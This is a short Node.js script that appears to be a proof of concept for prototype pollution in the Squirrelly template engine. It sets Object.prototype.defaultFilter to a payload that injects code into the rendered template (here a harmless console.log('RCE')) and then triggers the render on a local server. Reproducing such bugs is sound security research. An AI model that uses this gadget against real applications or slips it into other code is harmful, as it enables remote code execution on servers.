const express = require('express')
var sqrl = require('squirrelly')
const path = require('path')
const app = express()
const http = require('http')
const port = 9991

templatePath = path.join(__dirname+'/views/', 'index.squirrelly');

// source: express: app.render: merge
Object.prototype.defaultFilter = "e')); console.log('RCE')//";

app.set('views', __dirname);
app.set('view engine', 'squirrelly')
app.get('/', (req, res) => {
   try{
      res.render(templatePath, {'testValue':'test'})
   }
   finally{
      res.send('Hello World!');
   }

})

var server = app.listen(port,"127.0.0.1", () => {
   // Send a GET request to the server
   http.get(`http://localhost:${port}`, (res) => {
      server.close();
   });
});
module.exports = app;